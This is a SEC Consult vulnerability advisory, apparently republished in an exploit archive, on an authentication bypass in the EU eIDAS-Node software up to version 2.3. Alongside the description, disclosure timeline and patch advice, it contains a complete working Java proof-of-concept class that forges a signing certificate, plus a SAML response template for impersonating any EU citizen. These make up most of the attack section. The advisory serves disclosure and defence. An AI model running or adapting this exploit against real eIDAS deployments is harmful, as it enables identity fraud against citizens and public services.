@@ -1,0 +1,460 @@
+id: 33445
+date: 11/03/2019
+title: eIDAS-Node 2.3 Authentication Bypass Exploit
+author: Wolfgang Ettlinger
+cves: 
+
+=======================================================================
+              title: Authentication Bypass
+            product: eIDAS-Node
+ vulnerable version: <=v2.3 (v2.1 vulnerability #2)
+      fixed version: v2.3.1
+         CVE number: -
+             impact: critical
+           homepage: https://ec.europa.eu/cefdigital/wiki/display/CEFDIGITAL/eIDAS-Node+Integration+Package
+              found: 2019-06
+                 by: Wolfgang Ettlinger (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"The eIDAS-Node software is a sample implementation of the eID eIDAS Profile. It
+was developed by the European Commission with the help of Member States
+collaborating in the technical sub-committee of the eIDAS Expert Group. The
+eIDAS-Node software contains the necessary modules to help Member States to
+communicate with other eIDAS-compliant counterparts in a centralised or
+distributed fashion."
+
+URL: https://ec.europa.eu/cefdigital/wiki/display/CEFDIGITAL/eIDAS-Node+Integration+Package
+
+
+Business recommendation:
+------------------------
+During a short crash test SEC Consult identified critical vulnerabilities in
+the eIDAS-Node software component (EU cross-border authentication). These
+vulnerabilities could allow an attacker to impersonate any EU citizen.
+
+SEC Consult recommends to immediately apply the patch provided by the vendor,
+if this has not happened yet.
+Moreover, SEC Consult recommends operators of eIDAS-Node installations to
+conduct a forensic investigation into whether this vulnerability has already
+been abused.
+
+
+Vulnerability overview/description:
+-----------------------------------
+The communication between eIDAS Member States (MS) is based on SAML. The
+eIDAS node of an MS providing a service to citizens of another MS sends a
+SAML AuthNRequest to an eIDAS node that is capable of authenticating the citizen
+through her national authentication scheme (e.g. id card authentication).
+
+After the citizen has successfully authenticated, a SAML response is sent to the
+requesting eIDAS node. To verify the authenticity of the SAML response,
+eIDAS-Node verifies its signature and checks whether the signing certificate
+is trusted.
+
+Vulnerability #1: Certificate Faking
+The verification of the certificate trust is implemented as follows:
+1. The certificate is accepted if it is in the local trust store
+2. Otherwise the issuer certificate of the entity certificate is retrieved from
+   either the local trust store or from the supplemental certificates in the
+   SAML response.
+3. If a trust path can be established between the issuer certificate and a
+   certificate in the trust store, the entity certificate is accepted.
+
+It was found that, in step 2, the application searches for the the issuer
+certificate by comparing the Issuer DN of the entity certificate to the Subject
+DN of the potential issuer certificates.
+
+The application does not verify whether the entity certificate has been
+correctly signed by the issuer certificate. Moreover, other checks, such as
+whether the basic constraints of the issuer certificate allow it to act as a
+certificate issuer are not verified.
+
+An attacker can therefore sign a manipulated SAML response with a forged
+certificate. The certificate must contain an Issuer DN that matches the subject
+of  a certificate in the trust store. The subject must contain the country of
+the citizen (e.g. CN=FAKE, C=AT).
+
+
+Vulnerability #2: Missing Certificate Validation
+At least version 2.1 of the software uses the OpenSAML class
+ExplicitKeyTrustEvaluator to check whether the signer certificate is trusted.
+The method validate(...) returns a boolean value indicating whether trust could
+be established. However, eIDAS-Node does not check the return value and
+continues processing the SAML response. As effectively, the certificate's trust
+is not verified, an attacker can sign the SAML response with any certificate.
+
+This advisory demonstrates vulnerabilities against the endpoint that processes
+SAML responses. Other endpoints (e.g. the ones that process SAML requests) are
+likely affected as well (this has only partly been verified).
+
+NOTE: The version 2.1 is no longer supported in favor of the version 2.3.1.
+
+
+Proof of concept:
+-----------------
+Vulnerability #1: Certificate Faking
+The following Java class demonstrates the attack:
+
+----- snip -----
+package com.sec_consult.eidas_node.autologin;
+
+import java.io.InputStream;
+import java.math.BigInteger;
+import java.net.URI;
+import java.security.InvalidKeyException;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.PrivateKey;
+import java.security.PublicKey;
+import java.security.cert.X509Certificate;
+import java.util.Date;
+
+import javax.annotation.Nonnull;
+import javax.security.auth.x500.X500Principal;
+
+import org.apache.commons.lang.RandomStringUtils;
+import org.apache.xml.security.utils.EncryptionConstants;
+import org.bouncycastle.x509.X509V3CertificateGenerator;
+import org.opensaml.core.xml.config.XMLObjectProviderRegistrySupport;
+import org.opensaml.saml.saml2.core.AuthnRequest;
+import org.opensaml.saml.saml2.core.Response;
+import org.opensaml.security.x509.BasicX509Credential;
+import org.opensaml.security.x509.X509Credential;
+import org.opensaml.xmlsec.signature.KeyInfo;
+import org.opensaml.xmlsec.signature.Signature;
+import org.opensaml.xmlsec.signature.support.SignatureConstants;
+import org.opensaml.xmlsec.signature.support.Signer;
+
+import eu.eidas.auth.commons.xml.opensaml.OpenSamlHelper;
+import eu.eidas.auth.engine.core.impl.AbstractProtocolSigner;
+import eu.eidas.auth.engine.xml.opensaml.CertificateUtil;
+import eu.eidas.encryption.SAMLAuthnResponseEncrypter;
+import eu.eidas.engine.exceptions.EIDASSAMLEngineException;
+
+public class ResponseFaker {
+  /**
+   * Fake a response to an AuthnRequest
+   *
+   * @param request the request to be answered
+   * @param encryptedResponse any original response (only needed
+   *    to get a valid issuer and the encryption certificate)
+   * @param sp the URL of the requesting SP
+   * @param auth the target of the AuthnRequest
+   */
+  public String respondTo(String request, String encryptedResponse, URI sp,
+      URI auth) throws Exception {
+    AuthnRequest req = (AuthnRequest) OpenSamlHelper.unmarshall(request);
+    Response originalResp = (Response) OpenSamlHelper
+        .unmarshall(encryptedResponse);
+
+    X509Certificate origSignCert = CertificateUtil.toCertificate(
+        originalResp.getSignature().getKeyInfo().getX509Datas().get(0)
+        .getX509Certificates().get(0).getValue());
+    X509Certificate encCert = CertificateUtil.toCertificate(
+        originalResp.getEncryptedAssertions().get(0)
+        .getEncryptedData().getKeyInfo().getEncryptedKeys().get(0)
+        .getKeyInfo().getX509Datas().get(0)
+        .getX509Certificates().get(0).getValue());
+
+    String country = CertificateUtil.getCountry(origSignCert);
+
+    X500Principal subject = new X500Principal(
+        String.format("CN=FAKE, C=%s", country));
+    X500Principal issuer = origSignCert.getIssuerX500Principal();
+
+    BasicX509Credential signCredentials = createSignCredentials(issuer,
+        subject);
+
+    return createResponse(req.getID(), encCert, signCredentials,
+        sp.toString(), auth.toString(), country);
+  }
+
+  @SuppressWarnings("deprecation")
+  private BasicX509Credential createSignCredentials(X500Principal issuerDn,
+      X500Principal subjectDn) {
+    try {
+      KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
+      kpg.initialize(1024);
+      KeyPair keyPair = kpg.generateKeyPair();
+
+      PublicKey publicKey = keyPair.getPublic();
+      PrivateKey privateKey = keyPair.getPrivate();
+
+      X509V3CertificateGenerator certGen =
+          new X509V3CertificateGenerator();
+      certGen.setSerialNumber(new BigInteger("123"));
+      certGen.setIssuerDN(issuerDn);
+      certGen.setSubjectDN(subjectDn);
+      certGen.setNotBefore(new Date(0));
+      certGen.setNotAfter(new Date(2099, 1, 1));
+      certGen.setPublicKey(publicKey);
+      certGen.setSignatureAlgorithm("SHA256WithRSA");
+
+      return new BasicX509Credential(certGen.generate(privateKey),
+          privateKey);
+    } catch (Exception e) {
+      throw new RuntimeException(e);
+    }
+  }
+
+  private String createResponse(String inResponseTo,
+      X509Certificate encCertificate,
+      BasicX509Credential signCredentials, String spPrefix,
+      String authPrefix, String country) throws Exception {
+    String template;
+    try (InputStream is = this.getClass().getClassLoader()
+        .getResourceAsStream("template.xml")) {
+      template = new String(is.readAllBytes());
+    }
+
+    template = template.replace("%SP_PREFIX%", spPrefix);
+    template = template.replace("%AUTH_PREFIX%", authPrefix);
+    template = template.replace("%COUNTRY%", country);
+
+    Response response = (Response) OpenSamlHelper.unmarshall(template);
+    response.setID(RandomStringUtils.randomAlphabetic(20));
+    response.setInResponseTo(inResponseTo);
+
+    SAMLAuthnResponseEncrypter sre = SAMLAuthnResponseEncrypter.builder()
+        .dataEncryptionAlgorithm(
+            EncryptionConstants.ALGO_ID_BLOCKCIPHER_AES256_GCM)
+        .keyEncryptionAlgorithm(
+            EncryptionConstants.ALGO_ID_KEYTRANSPORT_RSAOAEP)
+        .build();
+
+    response = sre.encryptSAMLResponse(response,
+        new BasicX509Credential(encCertificate), true);
+
+    Signature signature = createSignature(signCredentials, false);
+    response.setSignature(signature);
+
+    XMLObjectProviderRegistrySupport.getMarshallerFactory()
+      .getMarshaller(response).marshall(response);
+
+    Signer.signObject(signature);
+
+    return new String(OpenSamlHelper.marshall(response));
+  }
+
+  // from
+  // eu.eidas.auth.engine.core.impl.AbstractProtocolSigner
+  // .createSignature(X509Credential, boolean)
+  private Signature createSignature(@Nonnull X509Credential credential,
+      boolean onlyKeyInfoNoCert)
+      throws EIDASSAMLEngineException {
+    Signature signature;
+
+    signature = (Signature) XMLObjectProviderRegistrySupport
+        .getBuilderFactory()
+        .getBuilder(Signature.DEFAULT_ELEMENT_NAME)
+        .buildObject(Signature.DEFAULT_ELEMENT_NAME);
+
+    signature.setSigningCredential(credential);
+
+    signature.setSignatureAlgorithm(
+        "http://www.w3.org/2001/04/xmldsig-more#rsa-sha512");
+
+    KeyInfo keyInfo = AbstractProtocolSigner
+        .createKeyInfo(credential, onlyKeyInfoNoCert);
+
+    signature.setKeyInfo(keyInfo);
+    signature.setCanonicalizationAlgorithm(
+        SignatureConstants.ALGO_ID_C14N_EXCL_OMIT_COMMENTS);
+    return signature;
+  }
+}
+----- snip -----
+
+The following SAML response was used as a template:
+
+----- snip -----
+<saml2p:Response
+  xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
+  xmlns:eidas="http://eidas.europa.eu/attributes/naturalperson"
+  xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
+  xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Consent="urn:oasis:names:tc:SAML:2.0:consent:obtained"
+  Destination="%SP_PREFIX%/EidasNode/ColleagueResponse"
+  ID="replace"
+  InResponseTo="replace"
+  IssueInstant="2000-01-01T00:00:00.000Z" Version="2.0">
+  <saml2:Issuer
+    Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">
+    %AUTH_PREFIX%/EidasNode/ServiceMetadata</saml2:Issuer>
+  <saml2p:Status>
+    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
+    <saml2p:StatusMessage>
+      urn:oasis:names:tc:SAML:2.0:status:Success
+    </saml2p:StatusMessage>
+  </saml2p:Status>
+  <saml2:Assertion
+    xmlns:eidas-legal="http://eidas.europa.eu/attributes/legalperson"
+    xmlns:eidas-natural="http://eidas.europa.eu/attributes/naturalperson"
+    ID="test"
+    IssueInstant="2000-01-01T00:00:00.000Z" Version="2.0">
+    <saml2:Issuer
+      Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">
+      %AUTH_PREFIX%/EidasNode/ServiceMetadata</saml2:Issuer>
+    <saml2:Subject>
+      <saml2:NameID
+        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"
+        NameQualifier="http://C-PEPS.gov.xx">0123456</saml2:NameID>
+      <saml2:SubjectConfirmation
+        Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml2:SubjectConfirmationData
+          Address="0.0.0.0"
+          NotOnOrAfter="2030-01-01T00:00:00.000Z"
+          Recipient="%AUTH_PREFIX%/EidasNode/ColleagueResponse" />
+      </saml2:SubjectConfirmation>
+    </saml2:Subject>
+    <saml2:Conditions
+      NotBefore="2000-01-01T00:00:00.000Z"
+      NotOnOrAfter="2030-01-01T00:00:00.000Z">
+      <saml2:AudienceRestriction>
+        <saml2:Audience>
+          %SP_PREFIX%/EidasNode/ConnectorMetadata
+          </saml2:Audience>
+      </saml2:AudienceRestriction>
+    </saml2:Conditions>
+    <saml2:AuthnStatement
+      AuthnInstant="2000-01-01T00:00:00.000Z">
+      <saml2:AuthnContext>
+        <saml2:AuthnContextClassRef>
+        http://eidas.europa.eu/LoA/high
+        </saml2:AuthnContextClassRef>
+        <saml2:AuthnContextDecl />
+      </saml2:AuthnContext>
+    </saml2:AuthnStatement>
+    <saml2:AttributeStatement>
+      <saml2:Attribute FriendlyName="LegalName"
+        Name="http://eidas.europa.eu/attributes/legalperson/LegalName"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-legal:LegalNameType">
+            Johann Wolfgang von Goethe
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="LegalPersonIdentifier"
+        Name="http://eidas.europa.eu/attributes/legalperson/LegalPersonIdentifier"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-legal:LegalPersonIdentifierType">
+            %COUNTRY%/%COUNTRY%/12345
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="FamilyName"
+        Name="http://eidas.europa.eu/attributes/naturalperson/CurrentFamilyName"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-natural:CurrentFamilyNameType">
+            Goethe
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="FirstName"
+        Name="http://eidas.europa.eu/attributes/naturalperson/CurrentGivenName"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-natural:CurrentGivenNameType">
+            Johann Wolfgang
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="DateOfBirth"
+        Name="http://eidas.europa.eu/attributes/naturalperson/DateOfBirth"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-natural:DateOfBirthType">
+            1749-08-28
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="PersonIdentifier"
+        Name="http://eidas.europa.eu/attributes/naturalperson/PersonIdentifier"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:type="eidas-natural:PersonIdentifierType">
+            %COUNTRY%/%COUNTRY%/12345
+          </saml2:AttributeValue>
+      </saml2:Attribute>
+    </saml2:AttributeStatement>
+  </saml2:Assertion>
+</saml2p:Response>
+----- snip -----
+
+
+Vulnerability #2: Missing Certificate Validation
+The following listing shows an excerpt of the method
+eu.eidas.auth.engine.xml.opensaml.CertificateUtil.checkExplicitTrust(...):
+
+public static void checkExplicitTrust(...)
+    throws CertificateException {
+[...]
+  final ExplicitKeyTrustEvaluator keyTrustEvaluator =
+    new ExplicitKeyTrustEvaluator();
+
+  keyTrustEvaluator.validate(
+    entityX509Cred,
+    (Iterable<Credential>) trustedCredentials);
+}
+
+As the return value of the validate method is not processed, any certificate
+would be found valid. Therefore, with minor changes the exploit for
+vulnerability #1 also works to exploit this scenario for version 2.1 (the
+second parameter for sre.encryptSAMLResponse has to be set to false).
+
+
+Vulnerable / tested versions:
+-----------------------------
+The version 2.3 was found to be vulnerable for vulnerability #1. This was the
+latest version at the time of discovery.
+
+Version 2.1 was found to be vulnerable to vulnerability #2.
+
+
+Vendor contact timeline:
+------------------------
+2019-07-04: Contacting vendor through CEF-EID-SUPPORT AT ec.europa.eu
+2019-07-09: Vendor asking for general information about vulnerability (affected
+            branch and modules)
+2019-07-10: Providing requested information
+2019-07-15: Vendor provided S/MIME certificates
+2019-07-16: Sending encrypted advisory
+2019-07-25: Vendor confirmed vulnerabilities, patch planned for v2.3.1,
+            vulnerability #2 has already been fixed before in v2.2
+2019-08-01: Vendor: vulnerability was fixed, patch privately shared with
+            affected parties, asked for postponing the release due to
+            deployment timing in affected parties
+2019-08-05: Asking for proposed new release date
+2019-08-05: Vendor proposed 2019-09-20 as release date, SEC Consult proposed
+            2019-09-24 as new date
+2019-08-08: Vendor: v2.3.1 has been released privately to MS
+2019-09-02: Informing CERT.at and CERT-Bund about the security issues
+2019-09-09: Due to delays in deployment by affected parties, vendor proposes
+            new release date of 2019-10-29
+2019-10-16: Vendor confirms release date
+2019-10-22: Sending preliminary blog post and advisory to vendor
+2019-10-24: Conference call to discuss blog post and advisory with vendor
+2019-10-29: Public release of the advisory
+
+
+Solution:
+---------
+Upgrade to the latest version 2.3.1.
+
+The updated version can be downloaded here:
+https://ec.europa.eu/cefdigital/wiki/display/CEFDIGITAL/All+releases
+
+#  0day.today [2023-03-22]  #
